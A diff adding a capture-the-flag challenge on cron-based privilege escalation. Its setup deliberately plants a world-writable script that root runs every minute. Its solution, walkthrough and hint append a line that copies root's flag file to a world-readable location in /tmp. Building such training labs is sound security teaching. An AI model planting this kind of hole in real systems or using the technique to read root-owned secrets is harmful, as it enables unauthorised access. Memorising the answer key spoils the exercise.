@@ -1,0 +1,53 @@
+title: A script root runs for you
+level: Advanced
+kind: Privilege escalation
+points: 80
+order: 21
+answer: flag
+
+@intro
+Root runs a script every minute (a cron job). Find the script, and if you can change
+it, make it copy root's flag (/root/flag.txt) somewhere you can read, then wait for
+the next minute. You are the user player.
+
+@setup
+useradd -m player 2>/dev/null || true
+printf '%s\n' '{{FLAG}}' > /root/flag.txt
+chmod 600 /root/flag.txt
+mkdir -p /opt/scripts
+cat > /opt/scripts/housekeeping.sh <<'SH'
+#!/bin/bash
+# tidy up temporary files
+find /tmp -type f -mtime +7 -delete 2>/dev/null
+SH
+chmod 777 /opt/scripts/housekeeping.sh
+echo '* * * * * root /opt/scripts/housekeeping.sh' > /etc/cron.d/housekeeping
+
+@solution
+ls -l /opt/scripts/housekeeping.sh
+cat /etc/cron.d/housekeeping
+echo 'cp /root/flag.txt /tmp/loot.txt; chmod 644 /tmp/loot.txt' >> /opt/scripts/housekeeping.sh
+#wait 60
+cat /tmp/loot.txt
+
+@walkthrough
+/etc/cron.d/housekeeping tells cron to run /opt/scripts/housekeeping.sh as root every
+minute. ls -l shows the script is world-writable (rwxrwxrwx, mode 777), so you can
+add a line to it:
+
+    echo 'cp /root/flag.txt /tmp/loot.txt; chmod 644 /tmp/loot.txt' >> /opt/scripts/housekeeping.sh
+
+Wait for the next minute (in the range, use the Skip 1 minute button), and your
+copy appears:
+
+    cat /tmp/loot.txt
+
+The lesson: a script root runs must be writable only by root, and so must every
+folder on the way to it.
+
+@hint 12
+Look in /etc/cron.d. Then check who can write the script it names (ls -l).
+
+@hint 20
+Append to the script: echo 'cp /root/flag.txt /tmp/loot.txt; chmod 644 /tmp/loot.txt'
+>> /opt/scripts/housekeeping.sh, wait a minute, then cat /tmp/loot.txt
